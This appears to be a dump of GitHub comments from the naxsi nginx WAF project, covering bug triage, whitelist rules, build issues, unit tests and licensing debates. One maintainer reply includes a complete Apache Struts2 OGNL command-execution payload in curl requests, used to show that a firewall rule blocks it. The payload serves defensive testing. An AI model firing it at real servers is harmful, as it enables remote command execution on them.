\"mz:$HEADERS_VAR:content-type\" \"s:DROP\";\nHowever, as charset/encoding is a never-ending joke that depends on the webserver you actually use, we don't think that including it in core-rules is a good idea. Thoughts ?\n. Shall we have an internal rule to explicitly drop all non-standard encodings ?. @qingweiqm : can you be a bit more explicit ? naxsi is url-decoding payloads where it makes sense (ie. url, form/url-encoded posts etc.), so it shouldn't \n. Thanks for the bug report, I'm looking into it :). Hello,\nFirst of all, really sorry for the delay of my answer, I've been busy on other topics :)\nSo, I looked a bit at the bug. The correct curl request is \ncurl -v --data-binary \"@csp.json\"  --header \"Content-Type: application/json\" http://127.0.0.1:4242/ (else the data would simply be the filename). I did the tests locally and it is correctly parsed (for the CSP case at leat).\nI'm now looking at the first blob you pasted !\n. Hello,\nI fixed the bug in https://github.com/nbs-system/naxsi/commit/2868972a00fdd950a505e88b1bcdcc75fa4ddd7b.\nI just need to add some extra tests, and merging into master.\n. Merge request pending.\n. Hello,\nThanks for the report.\nDo you have any suggestion on how you would like this header to be treated ?\n. <3 let me have a look :). closing and watching MR. It sounds good, but we need to add some unit-tests before we can merge.. Here is an example UT for the CSP part, I'll look more into it when I have some time to add extra tests.\n```perl\nvi:filetype=perl\nuse lib 'lib';\nuse Test::Nginx::Socket;\nplan tests => repeat_each(2) * blocks();\nno_root_location();\nno_long_string();\n$ENV{TEST_NGINX_SERVROOT} = server_root();\nrun_tests();\nDATA\n=== JSON0 : Valid CSP\n--- main_config\nload_module /tmp/naxsi_ut/modules/ngx_http_naxsi_module.so;\n--- http_config\ninclude /tmp/naxsi_ut/naxsi_core.rules;\n--- config\nlocation / {\n         SecRulesEnabled;\n     LearningMode;\n         DeniedUrl \"/RequestDenied\";\n         CheckRule \"$SQL >= 8\" BLOCK;\n         CheckRule \"$RFI >= 8\" BLOCK;\n         CheckRule \"$TRAVERSAL >= 4\" BLOCK;\n         CheckRule \"$XSS >= 8\" BLOCK;\n         root $TEST_NGINX_SERVROOT/html/;\n         index index.html index.htm;\n         error_page 405 = $uri;\n}\nlocation /RequestDenied {\n         return 412;\n}\n--- more_headers\nContent-Type: application/csp-report\n--- request eval\nuse URI::Escape;\n\"POST /\n{\\\"csp-report\\\":\n {\\\"document-uri\\\":\\\"https://example.com/foo/bar\\\",\\\"referrer\\\":\\\"https://www.google.com/\\\",\\\"violated-directive\\\":\\\"default-src self\\\",\\\"original-policy\\\":\\\"default-src self; report-uri /csp-hotline.php\\\",\\\"blocked-uri\\\":\\\"http://evilhackerscripts.com\\\"}}\"\n--- error_code: 200\n```. Hello,\nYes, naxsi blocks requests if it doesn't have any rules, and is not very explicit about it, it's confusing.\nI re-linked the old faq and opening an issue so that we throw an explicit error message when it happens.\n . @fabianfrz there is now a pending MR (#428 ) for this, we added an internal rule, so that you can tell naxsi not to drop request when no rules are present.\n. @fabianfrz Can you confirm it fixes the issue ? See https://github.com/nbs-system/naxsi/wiki/internal-rules#no_rules and https://github.com/nbs-system/naxsi/blob/master/t/31norules.t\nThanks !. Pending #428 . merged. thanks,. Thanks for the MR, giving it a look :). @calve would you mind adding some unit tests ? In the meanwhile I'm going to check if there are some pitfalls we might take care of when dealing with PATCH method.\n. Hello,\nThe difference is due to the fact that NAXSI_EXLOG uses NGX_ESCAPE_URI_COMPONENT while NAXSI_FMT uses NGX_ESCAPE_ARGS.\nBoth ensure that & is encoded, avoiding log injection, but it might be worth changing :)\n. Hello @limithit \nCan you provide a reproducible test ? I'm not sure to get your point :)\nThanks !\n. @limithit sorry was busy on other stuff, I'll try to take a look at it this week :). Hello again @limithit !\nAfter some testing, I was not able to reproduce (or I misunderstood something).\nnginx\n location / {\n  BasicRule id:4242 \"rx:multipart/form-data\" \"mz:$HEADERS_VAR:content-type\" \"s:DROP\";\n  LearningMode;\n  SecRulesEnabled;\nRequest :\ncurl -H \"Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='netstat -tupln').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\" localhost:4242\nThe request is correctly dropped by the rule :\n2018/07/24 13:56:29 [error] 9108#0: *1 NAXSI_FMT: ip=127.0.0.1&server=localhost&uri=/&learning=1&vers=0.56&total_processed=1&total_blocked=1&block=1&zone0=HEADERS&id0=4242&var_name0=content-type, client: 127.0.0.1, server: localhost, request: \"GET / HTTP/1.1\", host: \"localhost:4242\"\nHowever, beware, as content-type only makes sense for POST requests (that have a body).\nIf  you do the same request, without the custom rule, and issuing a POST method, you will get this :\ncurl -XPOST -vvv -d @/tmp/xxx -H \"Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='netstat -tupln').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\" localhost:4242\n```\n2018/07/24 14:02:44 [error] 9319#0: *9 NAXSI_FMT: ip=127.0.0.1&server=localhost&uri=/&learning=1&vers=0.56&total_processed=9&total_blocked=5&block=1&zone0=BODY&id0=11&var_name0=, client: 127.0.0.1, server: localhost, request: \"POST / HTTP/1.1\", host: \"localhost:4242\"\n```\nThe ID 11, triggered here is the uncommon content-type one.\nCan you either confirm or provide some further info ?\ncheers,\n. Hello,\nSorry for the delay of my answer :/\nI was unfortunately not able to reproduce the issue locally.\nAt first hand, I would think of a configuration error, but I don't see any mistake in your configuration..\nCan you include the full configuration if it isn't already the case, so I can give it a try locally ? (ie. I don't see the listen directive etc.)\nAre you still facing the issue ?\n. As I dont have access to your environement, I'm sorry but I can't reeally help.\nIn order to know if it's a configuration issue, can you attempt typing make re from naxsi_src directory ? It's going to download & install nginx+naxsi in your /tmp/, and conf can then be found in /tmp/naxsi_ut ?\n. Hello,\nHow did you install the package?\nI'm going to try to get my hands on a centos to give it a try.\nCan you maybe try running the unit tests (make test from naxsi_src dir -\nrequires test::nginx ) to see if something is preventing naxsi from working?\nThanks,\nLe jeu. 10 janv. 2019 \u00e0 17:01, Diadal notifications@github.com a \u00e9crit :\n\nI guess the plugin naxsi no longer working have done everything no error\nlog in nginx but naxsi still not working\n\u2014\nYou are receiving this because you were assigned.\nReply to this email directly, view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/431#issuecomment-453148937,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AA8d-lsPBT1MyINrIIsT4RUSibN-RsE4ks5vB2PqgaJpZM4VvDW9\n.\n. Nice catch, changing the comment right away :)\n. Hello,\n\nSorry missed that one, trying to start a review :)\n. Thanks, great @z0r0 :)\n. Hi !\nIt doesn't have to be before nginx core modules, but ideally  before third party modules :)\n. Hello @dertin !\n\nDoes your website have a lot of user interractions, or is it more like a blog or institutional website ?\nDoes your website evolves a lot ?\n\nIf your website have little user interactions (ie. forms with free text etc.), learning might be a good candidate.\nTo do so, run naxsi in learning mode on your website, generate some traffic (or wait for legitimate users to do so), and then use nxtool to :\n - inject generated logs into an elasticsearch\n - generate whitelists from those logs\nThe documentation on the main page of nxtool should help you. However, this requires you to setup an elastic-search :)\nAnother solution might be to use lasagna which is supposed to be an \"easy\" whitelist generator for naxsi. While I didn't try it myself, it might be suitable for your usage :)\nLet us know how we can help !\n. (updated your issue for formatting)\n. @loki008 : Can you provide example of the requests that doesn't generate expected results ?\nWe need a bit more context ;)\n. Hello @loki008 :)\nIn your example, it seems you get a 504, however, naxsi is configured to return 403 when it's triggered.\nI'm not sure to understand what is the bug exactly ? From the request and your rule, the request seem to be bocked as expected. \n\nAfter matching rules, there is no log record for access.log.\nIf the request is blocked, the NAXSI_FMT should end up in your error log and you won't see anything in the access log.\n\nWhen the LOG target is triggered, you should see a NAXSI_FMT as well, but request isn't blocked :)\nThanks :)\nPS: Please use markdown ` when pasting configuration of logs for readability :)\n. Hi @loki008 \nSorry, I don't understand your last message.\nCan you please provide me :\n - The version you were using (or even the git tag if it's not from releases)\n - The request that led to the crash ?\nThank you very much,\n. Thanks ! I'm looking if this is a bug in master :)\n. Hello,\nI was unable to reproduce from master neither, can you attempt on your side.\nYou can reproduce this by typing make re from naxsi_src directory. It's going to download & install nginx and naxsi in /tmp\nnginx.conf :\n```nginx\nmaster_process off;\nworker_processes  1;\ndaemon off;\nload_module /tmp/naxsi_ut/modules/ngx_http_naxsi_module.so;\nevents {\n worker_connections  1024;\n use select;\n}\nhttp {\n include /tmp/naxsi_ut/naxsi_core.rules;\n include       mime.types;\n default_type  application/octet-stream;\n sendfile        on;\n keepalive_timeout  65;\n server {\n  listen 4242;\nssl_certificate /tmp/nginx.crt;\nssl_certificate_key /tmp/nginx.key;\nserver_name  localhost;\n  set $naxsi_extensive_log 1;\n  location / {\n   LearningMode;\n   SecRulesEnabled;\n   DeniedUrl \"/50x.html\";\n   CheckRule \"$SQL >= 8\" LOG;\n   return 200;\nerror_log /tmp/ngx_error.log debug;\naccess_log /tmp/ngx_access.log;\nroot   html;\nindex  index.html index.htm;\n}\n  error_page   500 502 503 504  /50x.html;\n  location = /50x.html {\n  return 500;\n  #   root   html;\n  }\n }\n}\n```\n```\n$ curl -v \"localhost:4242/?foi=select+union\"\n\nGET /?foi=select+union HTTP/1.1\nHost: localhost:4242\nUser-Agent: curl/7.62.0\nAccept: /\n< HTTP/1.1 200 OK\n< Server: nginx/1.15.5\n\n```\nLogs:\n2018/11/23 12:13:04 [error] 19961#0: *4 NAXSI_EXLOG: ip=127.0.0.1&server=localhost&uri=%2F&id=1000&zone=ARGS&var_name=foi&content=select%2Bunion, client: 127.0.0.1, server: localhost, request: \"GET /?foi=select+union HTTP/1.1\", host: \"localhost:4242\"\n2018/11/23 12:13:04 [error] 19961#0: *4 NAXSI_FMT: ip=127.0.0.1&server=localhost&uri=/&vers=0.56&total_processed=4&total_blocked=0&config=learning&cscore0=$SQL&score0=8&zone0=ARGS&id0=1000&var_name0=foi, client: 127.0.0.1, server: localhost, request: \"GET /?foi=select+union HTTP/1.1\", host: \"localhost:4242\"\n. Please see : https://github.com/nbs-system/naxsi/wiki/internal-rules\n. sorry, I now properly documented it :)\nwould you  mind providing me the payload the triggered the id 20 ? I'd be curious about that, as it might be a false positive.\n. Can I have some tests pretty please :>\n. Hello !\nIn your example, your whitelist is restricted to URI that start with /index-prom\nBut you request starts with /lol cf. uri=/lol/index-promo\n. @tjosm can you try \nBasicRule wl:1310 \"mz:$URL_X:^/indkobskurv/$|$BODY_VAR_X:^cart\\[[0-9a-f]\\]\\[qty\\]|NAME\";\nIf you still have issues you can try to have something more generic such as \nBasicRule wl:1310 \"mz:$BODY_VAR_X:^cart\\[[0-9a-f]\\]\\[qty\\]|NAME\";\n. Hello,\nYes it does, however you need to beware of compability of versions between naxsi and nginx :)\n. @Onyx808 I suggest you to look at nginx's official documentation, naxsi is compiled same way as any other modules :) you can even look at the test suite (unit tests are using naxsi as a dynamic module). Hello, \nI don't know much about isitio/envoy, but will have a look.\nHowever, naxsi's design is strongly influenced by nginx's expected module behaviour, so this will be non trivial :). Hello,\nYes, we should do this way, wasn't aware they discontinued it, thanks !\n. Hello,\nWould you be able to provide a full http request that actually triggers the rule and that you supposed was not triggering in the past ?\nThanks,\n. Hey @Punamu thanks for the issue, gonna have a quick look into it :)\n. I don't really understand how naxsi would lead to a timeout, is there any logs produced after you added the whitelists ?\n. Yes I think it's a good idea, would you mind submitting a MR ? ;)\n. ideally : configured from nxapi.json ;)\n. unwanted change ? (is present in master)\n. unwanted change ? (exists in master)\n. unwanted change ? (deleted in master)\n. should check cf->args before accessing elts, I don't remember if this can be null ?\n. same as before, can cf->args or cf->args->elts can be null ?\n. Even if this seems a bit exotic, this is actually a good quesiton, as it seems user can change the max uri len accepted :\nhttps://stackoverflow.com/questions/1067334/how-to-set-the-allowed-url-length-for-a-nginx-request-error-code-414-uri-too\n. Yes, a simple comments indicating ids < 1000 are internal rules is good for clarity :). 100% :D. yep :). I think we want to be able to distinguish a request that was blocked because a rule trigger a drop while learning mode is off from a request that trigger a block while learning mode is off  :)\n(I tend to use DROP rules for vpatching or so, and thus might want to react differently to blocked and dropped requests)\n. Yes, this is my point :) I guess in terms of priority drop > block\n. I think that ternary is big enough that a good ol' if/else would help readability ;)\n. the order[+ ]?by frightens me for both perf and fp. ",
    "grk-": "Coding while drunk is fun again I guess :p\nSent from my mobile\nThibault Koechlin notifications@github.com a \u00e9crit\u00a0:\n\ndelayed until further notice, feedback tells it's not vital except for some specific corner cases.\nPlus blotus lost the code TWICE xD\n\u2014\nReply to this email directly or view it on GitHub.\ufffc\n. Hi,\n\nThe only reasonable reason I see would be that nginx is not compiled\nwith Naxsi support. Are you sure it is?\nCheers,\nDidider\nOn 21/02/2014 18:41, Eliezer Romero wrote:\n\nHi, I have this problem:\n\u2502Restarting nginx: nginx: [emerg] unknown directive \"MainRule\" in\n/etc/nginx/naxsi_core.rules:13\n\u2502nginx: configuration file /etc/nginx/nginx.conf test failed\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/13#issuecomment-35753990.\n. Leaving directory '/cygdrive/f/src/nginx-1.4.3'\n\nI guess it is cygwin for nginx 1.4.3 at least.\nDidier\nOn 08/11/2013 11:22, blotus wrote:\n\nHi,\nI've just pushed a commit that should fix the error.\nWhich OS are you using to build naxsi ? I was not able to replicate the\nissue.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/92#issuecomment-28053262.\n. \n",
    "eliezerfot123": "Hi, I have this problem:\n\u2502Restarting nginx: nginx: [emerg] unknown directive \"MainRule\" in /etc/nginx/naxsi_core.rules:13\n\u2502nginx: configuration file /etc/nginx/nginx.conf test failed \n. ",
    "hzrandd": "Firstly.........\n$ ./configure --add-module=/usr/local/Cellar/nginx_tcp_proxy_module \\\n  --add module=/Users/jake/jobs/naxsi-core-0.51-1/naxsi_src\nList a port  info.\n\nconfiguring additional modules\nadding module in /usr/local/Cellar/nginx_tcp_proxy_module\nchecking for nginx_tcp_module ... found\n- ngx_tcp_module was configured\n  adding module in /Users/jake/jobs/naxsi-core-0.51-1/naxsi_src\n- ngx_http_naxsi_module was configured\n  checking for PCRE library ... found\n  checking for PCRE JIT support ... not found\n  checking for OpenSSL library ... found\n  checking for zlib library ... found\n  creating objs/Makefile\nConfiguration summary\n- using system PCRE library\n- using system OpenSSL library\n- md5: using OpenSSL library\n- sha1: using OpenSSL library\n- using system zlib library\nnginx path prefix: \"/usr/local/nginx\"\n  nginx binary file: \"/usr/local/nginx/sbin/nginx\"\n  nginx configuration prefix: \"/usr/local/nginx/conf\"\n  nginx configuration file: \"/usr/local/nginx/conf/nginx.conf\"\n  nginx pid file: \"/usr/local/nginx/logs/nginx.pid\"\n  nginx error log file: \"/usr/local/nginx/logs/error.log\"\n  nginx http access log file: \"/usr/local/nginx/logs/access.log\"\n  nginx http client request body temporary files: \"client_body_temp\"\n  nginx http proxy temporary files: \"proxy_temp\"\n  nginx http fastcgi temporary files: \"fastcgi_temp\"\n  nginx http uwsgi temporary files: \"uwsgi_temp\"\n  nginx http scgi temporary files: \"scgi_temp\"\n  ####################################################\nSecond....\n$ make \n\n/usr/include/openssl/ssl.h:1547:6: note: 'SSL_CTX_set_client_CA_list' has been explicitly marked deprecated here\nvoid SSL_CTX_set_client_CA_list(SSL_CTX ctx, STACK_OF(X509_NAME) name_list) DEPRECATED_IN_MAC_OS_X_VERSION_10_7_AND_LATER;\n     ^\n10 warnings generated.\ncc -c   -I src/core -I src/event -I src/event/modules -I src/os/unix -I /usr/local/Cellar/nginx_tcp_proxy_module/modules -I /usr/local/Cellar/nginx_tcp_proxy_module/parsers -I /usr/local/Cellar/nginx_tcp_proxy_module -I objs -I src/http -I src/http/modules -I src/mail \\\n        -o objs/addon/naxsi_src/naxsi_runtime.o \\\n        /Users/jake/jobs/naxsi-core-0.51-1/naxsi_src/naxsi_runtime.c\ncc -c   -I src/core -I src/event -I src/event/modules -I src/os/unix -I /usr/local/Cellar/nginx_tcp_proxy_module/modules -I /usr/local/Cellar/nginx_tcp_proxy_module/parsers -I /usr/local/Cellar/nginx_tcp_proxy_module -I objs -I src/http -I src/http/modules -I src/mail \\\n        -o objs/addon/naxsi_src/naxsi_config.o \\\n        /Users/jake/jobs/naxsi-core-0.51-1/naxsi_src/naxsi_config.c\ncc -c   -I src/core -I src/event -I src/event/modules -I src/os/unix -I /usr/local/Cellar/nginx_tcp_proxy_module/modules -I /usr/local/Cellar/nginx_tcp_proxy_module/parsers -I /usr/local/Cellar/nginx_tcp_proxy_module -I objs -I src/http -I src/http/modules -I src/mail \\\n        -o objs/addon/naxsi_src/naxsi_utils.o \\\n        /Users/jake/jobs/naxsi-core-0.51-1/naxsi_src/naxsi_utils.c\ncc -c   -I src/core -I src/event -I src/event/modules -I src/os/unix -I /usr/local/Cellar/nginx_tcp_proxy_module/modules -I /usr/local/Cellar/nginx_tcp_proxy_module/parsers -I /usr/local/Cellar/nginx_tcp_proxy_module -I objs -I src/http -I src/http/modules -I src/mail \\\n        -o objs/addon/naxsi_src/naxsi_skeleton.o \\\n        /Users/jake/jobs/naxsi-core-0.51-1/naxsi_src/naxsi_skeleton.c\ncc -c   -I src/core -I src/event -I src/event/modules -I src/os/unix -I /usr/local/Cellar/nginx_tcp_proxy_module/modules -I /usr/local/Cellar/nginx_tcp_proxy_module/parsers -I /usr/local/Cellar/nginx_tcp_proxy_module -I objs -I src/http -I src/http/modules -I src/mail \\\n        -o objs/addon/naxsi_src/naxsi_json.o \\\n        /Users/jake/jobs/naxsi-core-0.51-1/naxsi_src/naxsi_json.c\ncc -c  -I src/core -I src/event -I src/event/modules -I src/os/unix -I /usr/local/Cellar/nginx_tcp_proxy_module/modules -I /usr/local/Cellar/nginx_tcp_proxy_module/parsers -I /usr/local/Cellar/nginx_tcp_proxy_module -I objs \\\n        -o objs/ngx_modules.o \\\n        objs/ngx_modules.c\n\nlet's to see, naxsi info was output.\nthen.........\n$ sudo make install\nit seems no error. but when i check the configure info:\n\n$ sudo /usr/local/nginx/bin/nginx -V\nnginx version: nginx/1.4.4\nTLS SNI support enabled\nconfigure arguments: --add-module=/usr/local/Cellar/nginx_tcp_proxy_module\n\nTo see,there is no naxsi module.why not ?\n. use ModSecurity for Nginx  but not Naxis?\n. ",
    "kgodwin": "I'd just like to bump this issue as its part of why I'm considering using Mod_Security instead of Naxsi (Unclear license).\nThe Readme & the GPL license are in direct conflict.\nThis issue has been ignored for a year and should be clarified. If clarification is unreasonable, this situation would allow a pure GPL community fork to exist in any event. So if you don't want to clarify, I'm just going to fork & remove that bit from the README so I can just deal with everything under the GPL.\nIf you have an objection to this, let me know.\nThanks.\n. Just figured I'd give this a bump since its been 3+ months.\n. ",
    "davidstrauss": "In addition, it's unclear how the rules are licensed, given that there's no repository-wide license posted in a file like LICENSE.txt or COPYING.txt.\n. ",
    "organsnyder": "I'm unable to use this software on my company's servers because of this license. Please consider adopting a standard OSI-approved license.\n. ",
    "singold": "Hi, I was wondering about this contradiction as well, I've learned about the project from OWASP, and AFAIK, OWASP sponsored projects should have an FLOSS license.\nIt should be safe to assume it is GPL 2, as it is stated in the OWASP project page, but I think this should be resolved, because it harms the project as a whole.\nLooking foward to hearing from the developers\nRegards\n. Reading the code, I've found that most files have a license header that say it is GPLv2, so I've created a pull request (#196) adding the license an reflecting that change in the README.\n. ",
    "whiteadam": "+1\n. ",
    "jvoisin": "Currently, github shows that the project is under GPLv3.\n. Well, what about no?\n. It seems that we also have some naming issues:\n\nBeyond this, I find (admittedly pedantic) issues with small chunks of source (and I\u2019m not the only one). Naxsi uses a mix of prefixes among strucs and functions; the use of ngx_http_ is particularly confusing, especially to new developers. This namespace pollution is wholly unnecessary. There are also a number of compile-time definitions that feel like they should be configurable (at least as an advanced option), including recursive JSON parsing depth and PCRE ovec sizes, and overall the codebase is littered with inconsistent style. It feels very much like an odd, organic blend of data-driven architecture and hard-coded logic branches based on rule definitions, making extension and development very difficult.\n\nThis should be addressed too :). Still not perfect :/\n. This is why it has been merged :)\n. It's working here\u2122\n$ apt-get install nginx-naxsi\nReading package lists... Done\nBuilding dependency tree       \nReading state information... Done\nThe following extra packages will be installed:\n  nginx-common\nSuggested packages:\n  fcgiwrap nginx-doc\nThe following NEW packages will be installed:\n  nginx-common nginx-naxsi\n0 upgraded, 2 newly installed, 0 to remove and 0 not upgraded.\nNeed to get 322 kB of archives.\nAfter this operation, 1 015 kB of additional disk space will be used.\nDo you want to continue? [Y/n] \nGet:1 http://fr.archive.ubuntu.com/ubuntu/ utopic/main nginx-common all 1.6.2-1ubuntu1.1 [19,3 kB]\nGet:2 http://fr.archive.ubuntu.com/ubuntu/ utopic/universe nginx-naxsi amd64 1.6.2-1ubuntu1.1 [302 kB]\nFetched 322 kB in 0s (917 kB/s)      \nSelecting previously unselected package nginx-common.\n(Reading database ... 229434 files and directories currently installed.)\nPreparing to unpack .../nginx-common_1.6.2-1ubuntu1.1_all.deb ...\nUnpacking nginx-common (1.6.2-1ubuntu1.1) ...\nSelecting previously unselected package nginx-naxsi.\nPreparing to unpack .../nginx-naxsi_1.6.2-1ubuntu1.1_amd64.deb ...\nUnpacking nginx-naxsi (1.6.2-1ubuntu1.1) ...\nProcessing triggers for man-db (2.7.0.2-2) ...\nProcessing triggers for ureadahead (0.100.0-16) ...\nureadahead will be reprofiled on next reboot\nProcessing triggers for ufw (0.34~rc-0ubuntu4) ...\nSetting up nginx-common (1.6.2-1ubuntu1.1) ...\nProcessing triggers for ureadahead (0.100.0-16) ...\nProcessing triggers for ufw (0.34~rc-0ubuntu4) ...\nSetting up nginx-naxsi (1.6.2-1ubuntu1.1) ...\n$ lsb_release -a\nNo LSB modules are available.\nDistributor ID: Ubuntu\nDescription:    Ubuntu 14.10\nRelease:    14.10\nCodename:   utopic\n$\nDi you do an apt-get update before installing naxsi?\n. nxtool knows how to read naxsi/syslog logs, not CLF ones.\n. I works here, but you have to compile it yourself. Feel free to ask the Debian people to package it for you, or even better, package it, and try to push it upstream.\n. Care to elaborate?\nOne of the point of GPLv3 is to deal with IoT :P\n. Aw 3. <sFuck, I thought that the vote was anonym OMG MY ACCOUNT WAS HACKED! I wish I could remove my vote, but alas, it's too late. \n. @lookingcloudy ping ?\n. - How can one issue a request to an internal location?\n  - This is documented here\n- What kind of decision would the admin take upon such a notification?\n. You can already to that via whitelisting, for example:\nBasicRule \"mz:$HEADERS_VAR_X:!(cookie)|$HEADERS_VAR_X:!(accept-encoding)|$HEADERS_VAR_X:!(accept-language)|$HEADERS_VAR_X:!(cache-control)|$HEADERS_VAR_X:!(connection)|$HEADERS_VAR_X:!(dnt)|$HEADERS_VAR_X:!(host)|$HEADERS_VAR_X:!(pragma)|$HEADERS_VAR_X:!(user-agent)\";\nIt would be less ghetto to do it that way once #271 is fixed ;)\n. Read the documentation, naxsi needs configuration to work with your application, it won't play nice out of the box.\n. It seems that reading the documentation was enough.\n. Your pull-request doesn't even compile, it won't be reviewed until it does.. You can fix it yourself by changing the .travis.yml file in your branch, to set the right options.. You can do that with nginx, no need for naxsi.\nI don't get the second part of your question.. The modified rule 1000 will still match, since ( and + aren't words.. Good old selected fromage <3. We missed the deadline.. I hope that adding stuff into the config file won't put them for the whole compilation process: this would be ridiculous. We should indeed add options in this file.. No, there isn't (yet), sorry; you'll have to compile naxsi yourself for now.. You can write a rule that match on user-agent I guess, something like mainRule \"mz:$HEADER:User-agent\" \"rx:[0-9\\\"]\" \"s:$DOS\" \"id:1337\";. You can of course whitelist the search engines, since their ranges are public (or by user-agent, but it won't take long for the attacker to detect this I guess). Thank you \u2665. I think that despite the fact that naxsi might block some legitimate requests with fancy encoding, this is the way to go\u2122, because there is no other ones.. Since naxsi is used in countries that are likely using fancy encodings, I don't think that we should :D. Can you try to add those lines to your configuration:\nCheckRule \"$SQL >= 8\" BLOCK;\n   CheckRule \"$RFI >= 8\" BLOCK;\n   CheckRule \"$TRAVERSAL >= 4\" BLOCK;\n   CheckRule \"$EVADE >= 4\" BLOCK;\n   CheckRule \"$XSS >= 8\" BLOCK;. Adding the naxsi_core.rules file shouldn't change much to naxsi's compulsory request blocking behaviour :/\nThe file is under LGPL, but those are only generic rules, you can rewrite them pretty easily.. Perfect \u2665. Yup, this is the way to go :). The PR in question being #434 . You might want to take a look at the example configuration provided in the wiki :). I think that you mispasted something, because your server block is inside your http one. My bad, you're absolutely right. The latest config that you pasted doesn't work? I don't see anything wrong with it.\nAre you running the nginx you're using is the one with the naxsi plugin?. @buixor feel free to check this Snuffleupagus commit, on how to use gitlab-ci to run the testsuite/compilation on several linux distributions :). According to the documentation, something like this should work:\nBasicRule wl:1100 \"mz:$URL_X:^/emoneyreport/deletepin/deletepin/member_id/\";. Yeah, apparently, URL can't be a zone on its own, so maybe something like this instead:\nBasicRule wl:1100 \"mz:$URL_X:^/emoneyreport/deletepin/deletepin/member_id/|URL\";. Thank you for using naxsi :). The right way\u2122 to enforce a coding style would be to submit a script to do it, instead of expecting a thorough review of +5,088 \u22124,855 lines of code that don't add any user-facing value :/. Have you checked the relevant documentation? Also, are you sure that naisi_core_rules doesn't contain a typo?\nOn a side note, please avoid using screenshot for texts: they do not permit text selection, aren't great to zoom on, and aren't readable by blind people.. Implementing this feature isn't planned, but if you want to give a shot at doing it, I'll be happy to review your merge-request.. While it's possible, it sounds like a super-duper bad idea, and it's unlikely that someone will help you to shoot yourself in the foot :/\nWhat is your usecase exactly?. This won't work, there is not such thing as \"minimum security rules\" : naxsi has little intelligence, it blocks everything; it's up to its operators to be smart and whitelist what is legit. The other way around doesn't work at all :/. There is no recommended configuration, as naxsi is a whitelist-based WAF; each configuration is heavily tied to the underlying application.. Wow, I didn't know about lasagna, shouldn't it be mentioned in the documentation @buixor ?. Please use plain-text instead of screenshots for the logs: copy/pasting is more convenient, and also more accessible, since not everyone is able to see pictures.\nAlso, it seems that your question is unrelated to this issue, feel free to create a new one instead.. What about something like BasicRule wl:1310 \"mz:$URL:/indkobskurv/|$BODY_VAR_X:^cart\\[[0-9a-f]\\]\\[qty\\]|NAME\"; ?. What about macroifying this to avoid probable/possible mistakes due to copy-pasta?. Couldn't tmp_uri->len wrap around ?. It might to nice to explain why < 1000 :). Compilers are smart, you can write strlen(\"$OTHERS\"), it'll be optimised.. This screams \"INTEGER OVERFLOW\" all over, but since it's in user-supplied configuration, I guess that we don't care that much, do we?. Only GET, POST and PATCH. We're not handling HEAD, DELETE, \u2026\nShouldn't we keep this part?. Isn't this comment wrong?. else if ?. How can you return two values in a int ;). \"unknown\" should never happen, the right\u2122 way would be to use an assertion here.. ",
    "p0pr0ck5": "Is there any movement here? There is still a conflict between the provided LICENSE file (GPL3) and various legal headers in source (GPL2).. ",
    "spacecwoboy": "Ubuntu 12.04.  I'll test and post back.  Thanks for quick response.\n. Blotus - The update works like a champ.  Make && installed, no issues.  Nice work.\n. ",
    "onexpiece": "Hi,\nI followed your advise, update to 0.53-1 and check that Test::nginx had been installed, but it didn't help. \nstill got \"WL TEST 1.0: Obvious test in arg - Can't connect to localhost:1984: Connection refused\nRetry connecting after 0.75 sec\".\nIt would be appreciate if you can give the steps to run these test. \nthx,\n. My full nginx.conf as following.\nnginx.conf\n```\nuser  nginx;\nworker_processes  1;\nworker_rlimit_nofile 65535;\nerror_log  logs/error.log error;\npid        logs/nginx.pid;\nevents {\n    use epoll;\n    worker_connections  65535;\n}\nhttp {\n    include       naxsi_core.rules; \n    include       mime.types;\n    default_type  application/octet-stream;\nlog_format main '$remote_addr - $remote_user [$time_local] \"$request_method http://$http_host$request_uri $server_protocol\" '\n                '$status $bytes_sent \"$http_referer\" \"$http_user_agent\" '\n                '$request_time $upstream_response_time $body_bytes_sent $content_length $http_range - - $request_length';\naccess_log  logs/access.log  main;\n\nkeepalive_timeout  65;\n#gzip  on;\n\nclient_header_buffer_size 16k;\nlarge_client_header_buffers 4 64k;\n\nupstream  local_upstream  {\n    server   127.0.0.1:8101;\n}\n\nserver {\n    listen       9101 default;\n    server_name  www.test.com;\n    error_log    logs/servers/www.test.com.log;\n\n    location / {\n        try_files $uri @backend;\n\n    }\n    location ~ /test/form.php {\n        valid_referers none blocked server_names www.test.com ; \n        if ($invalid_referer) {\n            return 403;\n        }\n        try_files $uri @backend;\n    }\n\n    location @backend {\n        LearningMode;\n        SecRulesEnabled;\n        DeniedUrl \"/RequestDenied\";\n\n        CheckRule \"$SQL >= 8\" BLOCK;\n        CheckRule 